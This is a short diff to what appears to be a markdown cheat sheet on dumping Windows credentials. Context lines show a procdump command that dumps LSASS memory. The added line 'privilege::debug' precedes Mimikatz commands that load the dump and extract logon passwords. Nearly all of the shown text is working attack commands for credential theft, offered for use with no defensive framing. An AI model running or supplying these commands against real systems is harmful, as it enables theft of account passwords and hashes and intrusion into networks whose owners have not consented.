@@ -36,6 +36,7 @@ procdump.exe -ma lsass.exe <output path>  # use -r flag to avoid reading lsass b
 
 Extract Passwords
 ```shell
+privilege::debug
 sekurlsa::minidump <dump path>
 sekurlsa::logonpasswords
 ```
